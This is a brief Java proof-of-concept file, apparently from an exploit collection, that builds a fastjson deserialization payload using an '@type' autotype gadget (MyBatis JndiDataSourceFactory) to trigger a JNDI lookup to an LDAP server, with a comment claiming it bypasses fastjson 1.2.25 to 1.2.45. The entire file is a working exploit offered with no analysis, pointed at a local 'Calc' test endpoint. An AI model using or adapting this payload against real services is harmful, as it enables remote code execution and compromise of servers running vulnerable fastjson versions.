import com.alibaba.fastjson.JSON;

public class FastjsonBypass4 {
    public static void main(String[] args) {
        // bypass fastjson 1.2.25 - 1.2.45
        String payload = "{\"@type\": \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\": {\"data_source\": \"ldap://localhost:1389/Calc\"}}";

        JSON.parse(payload);
    }
}
